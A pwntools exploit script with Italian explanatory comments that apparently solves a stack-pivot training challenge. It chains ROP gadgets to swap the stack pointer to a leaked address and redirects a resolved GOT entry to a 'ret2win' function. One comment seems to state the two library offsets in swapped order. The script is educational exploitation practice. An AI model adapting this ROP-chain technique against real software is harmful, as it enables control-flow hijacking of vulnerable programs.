from pwn import *
import io
elf = ELF("./pivot")
lib = ELF("./libpivot.so")
p = process("./pivot")

"""
    Per questo esercizio ci viene fornito direttamente dal programma un indirizzo di memoria da
    utilizzare come pivot. In pratica viene eseguita una traslazione virtuale dello stack, 
    facendo finta che questi sia collocato in una posizione diversa dall'originale, poiché
    altrimenti non sarebbe possibile inserire la ropchain nello spazio originale che risulta
    essere molto ridotto.

    Definisco una funzione che vada a pescare dal terminale l'indirizzo corretto, dato che cambia
    a ogni esecuzione del programma.
"""

def get_pivot():
    for _ in range(4):
        p.recvline()
    line = p.recvline()
    pivot = p64(int(line[56:69],16))
    return pivot
pivot = get_pivot()

pop_rax = p64(0x00000000004009bb)
pop_rbp = p64(0x00000000004007c8)
xchg_rax_rsp = p64(0x004009bd)
mov_rax_qword_rax = p64(0x004009c0)
add_rax_rbp = p64(0x004009c4)
call_rax = p64(0x00000000004006b0)

"""
    PLT = Procedure Linkage Table --> Cerca nella got.plt gli offset delle funzioni da chiamare. Se un
    								  indirizzo non è già presente nella GOT, allora ne richiede 
    								  l'inserimento
    GOT = Global Offset Table ------> Contiene gli offset delle funzioni importate da librerie esterne
    
    Sfruttiamo la chiamata a plt e a got della funzione foothold_function. Nel momento in cui viene chiamata 
    plt.foothold_function, facendo parte di una libreria esterna al programma, il suo indirizzo all'interno 
    di tale libreria, se non già presente, viene riportato su got, in modo da poter chiamare tale funzione
    successivamente. All'interno della stessa libreria è presente anche ret2win, cioè la funzione che 
    vorremmo chiamare, quindi possiamo usare foothold_function come trigger per l'inserimento in GOT di un 
    offset, andando poi a inserire l'indirizzo che vogliamo noi, cioè quello di ret2win.
"""

foothold_function = p64(elf.symbols["plt.foothold_function"])
ret2win = p64(lib.symbols["ret2win"])
foothold_function_got_plt = p64(elf.symbols["got.foothold_function"])

"""
    Iniziamo traslando lo stack. In RAX mettiamo l'indirizzo del pivot, poi modifichiamo lo stack pointer 
    andando a scambiarne il valore con quello di RAX. Ora lo stack è spostato più in alto, consentendo 
    l'inserimento di una ropchain più lunga.
"""

rop1 = pop_rax + pivot + xchg_rax_rsp

"""
    Iniziamo chiamando foothold_function. Il suo offset viene inserito automaticamente all'interno di got.plt,
    per cui lo salviamo in memoria scrivendolo in RAX. In seguito, in RAX non vogliamo più solo l'offset di
    foothold_function in got.plt, ma voglio un puntatore proprio all'area di memoria corrispondente, quindi
    facciamo mov RAX, [RAX]. In un altro registro, come RBP, andiamo a salvarci la differenza fra gli offset di
    foothold_function e ret2win nella libreria esterna, rispettivamente 0x00000a81 e 0x0000096a. 
    Fatto questo, spostiamo il puntatore a foothold_function in modo che punti a ret2win, andando a sommare la
    differenza fra gli offset a RAX, cioè al puntatore di foothold_function; infine chiamiamo la funzione
    puntata da RAX, cioè ret2win.
"""

rop2 = foothold_function
rop2 += pop_rax + foothold_function_got_plt
rop2 += mov_rax_qword_rax
rop2 += pop_rbp + p64(0x00000a81 - 0x0000096a)
rop2 += add_rax_rbp
rop2 += call_rax


p.recvuntil('> ') 
p.send(rop2)  
p.recvuntil('> ')      
random = cyclic(40) + rop1
p.send(random)
p.interactive()
